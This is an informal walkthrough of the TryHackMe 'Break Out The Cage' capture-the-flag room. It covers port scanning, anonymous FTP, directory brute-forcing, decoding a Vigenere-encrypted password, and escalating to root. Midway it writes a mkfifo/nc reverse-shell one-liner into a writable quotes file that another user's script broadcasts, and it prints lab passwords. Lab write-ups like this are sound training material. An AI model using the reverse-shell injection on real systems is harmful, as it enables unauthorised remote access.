@@ -1,0 +1,124 @@
+Break Out The Cage - THM
+
+Scan the network:
+nmap -sV -O 10.48.189.194
+
+We see three ports open:
+21/ftp
+22/ssh
+80/http
+
+Lets run a script scan to check for possible misconfig:
+nmap -sV -O -sC -p21,22,80 10.48.189.194
+
+21/ftp
+Anonymous login allowed
+Nothing interesting apart from that
+
+Explore ftp/21:
+ftp anonymous@10.48.189.194
+Password: <enter>
+ls -la
+(we see one file called dad_tasks)
+get dad_tasks
+exit
+
+ls
+cat dad_tasks
+(We some gibberish/code)
+
+Use Cyberchef to crack it:
+We get some kind of organised gibberish, might come useful later.
+
+Explore 80/http:
+Visit http://10.48.189.203 - nothing much
+Try /robots.txt : again nothing much (no access)
+Check source code (ctrl+c) - nothing much
+
+curl -s http://10.48.189.194 (nothing here as well)
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.48.189.194
+We find a lot of directory:
+/images - nothing
+/html - nothing
+/scripts - nothing
+/contracts -  nothing 
+
+/auditions -  
+In this directory we can find an audio file. when we open it with audacity. Using Audacity, I changed my view to Spetrogram which lets me view the different frequencies.
+We see a word: namelesstwo
+
+Lets use this word as a key to crack the gibberish we received earlier. 
+
+We can use Boxentriq to analyze random cypher and codes when we recieve them, as per data this time it is
+Vigenere Cpiher
+
+Go to vigenere cipher and dycrpt the code using namelesstwo as key.
+We get password for Weston as per the question. 
+
+22/ssh:
+Lets login to ssh using Weston creds:
+ssh westom@10.48.189.194
+Password:
+
+We are in. Do enum
+id
+whoami
+ls -la
+pwd
+sudo -l
+
+We see:
+(root) /usr/bin/bees
+Sadly nothing useful.
+
+Lets do priv escalation enum using linpeas.sh
+We find an hidden directory called .dad_scripts inside /opt
+
+Frther we find spead_the_qoutes.py
+cd /opt
+cd .dads_scripts
+cat spread_the_quotes.py
+
+This script reads a random line from a hidden file called “.quotes” and then broadcasts the quote to logged in users with the “wall” command. I know that the “Weston” user is part of the “cage” group by using the “id” command.
+
+We only have read perm for spread_the_qoutes but we have write access for .qoutes.py
+
+cd .files
+
+nc -lnvp 4444
+
+echo "hacked:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP_ADDRESS> 4444 >/tmp/f" > .quotes
+
+Wait for few minutes and we have a shell.
+
+whoami
+ls
+( we see two files, check Super_Duper_Checklist)
+cat Super_Duper_Checklist
+(We have our user Flag)
+
+Now we need to escalate to root for root flag.
+Check the other file: email_backup
+cd email_backup
+(we see three emails. read them)
+
+email_1 : nothing
+email_2: we find that Sean is root user
+email_3: we have password for sean, need to decrpyt it.
+We see face mentioned multiple times in the text, maybe thats the key
+
+Random cypher
+key:face
+Vignere cipher and we have our password
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+su root
+password: cageisnotalegend
+cd /root
+ls -la
+cd email_backup
+ls -la
+cat email_1 (nothing)
+cat email_2 (we have out flag)
+GG!!!!
